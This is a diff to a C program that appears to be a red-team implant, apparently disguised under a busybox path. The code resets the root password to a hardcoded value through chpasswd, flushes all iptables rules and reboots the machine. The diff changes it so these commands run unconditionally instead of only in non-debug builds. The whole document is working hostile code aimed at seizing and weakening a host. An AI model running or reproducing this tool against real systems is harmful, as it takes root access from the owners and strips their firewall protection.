@@ -28,7 +28,7 @@
 
 #define REALPATH "/var/lib/busybox"
 #define MAXPATHLEN 50
-#define PASSWORD "root:redteamrocks"
+#define PASSWORD "root:redteamrocks\n"
 #define DEBUG 0  // Set to 1 to enable debug output
 
 
@@ -50,28 +50,25 @@ operation_t operations[] = {
 void reset_password(void) {
     char *args[] = { "chpasswd", NULL };
 #if !(DEBUG)
-    execvp(args[0], args);
-#else
     printf("password reset\n");
 #endif // !DEBUG
+    execvp(args[0], args);
 }
 
 void reboot_system(void) {
     char *args[] = { "reboot", NULL };
 #if !(DEBUG)
-    execvp(args[0], args);
-#else
     printf("reboot\n");
 #endif // !DEBUG
+    execvp(args[0], args);
 }
 
 void flush_iptables(void) {
     char *args[] = { "iptables", "-F", NULL };
 #if !(DEBUG)
-    execvp(args[0], args);
-#else
     printf("iptables flush\n");
 #endif // !DEBUG
+    execvp(args[0], args);
 }
 
 operation_t choose_operation(void) {
@@ -98,7 +95,7 @@ int main(int argc, char **argv) {
     // utility
     int pipefd[2];
     pipe(pipefd);
-    char *str = PASSWORD "\n" PASSWORD "\n";
+    char *str = PASSWORD;
     int len = strlen(str);
     write(pipefd[1], str, len);
 
